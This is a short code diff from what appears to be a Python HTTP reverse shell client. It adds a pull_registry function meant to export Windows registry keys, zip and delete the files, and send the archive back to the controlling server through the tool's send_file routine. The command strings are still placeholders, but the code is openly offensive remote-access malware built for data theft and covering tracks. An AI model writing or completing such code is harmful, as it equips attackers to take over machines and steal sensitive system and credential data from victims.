@@ -17,7 +17,7 @@ HTTP Reverse Shell Client
 
 def send_file(command):
     """
-    Sends requested file back to server 
+    Sends requested file back to server
 
     args:
         command (str): string containing path to file
@@ -41,7 +41,10 @@ def send_file(command):
 
 
 def pull_registry():
-    pass
+    reg_cmd = ''    # single line command to export reg keys, zip the files, delete the files
+    exp_cmd = '^ file_path'  # path to zip file containing reg keys, start with `^ `
+    run_process(reg_cmd)
+    send_file(exp_cmd)
 
 
 def run_process(command):
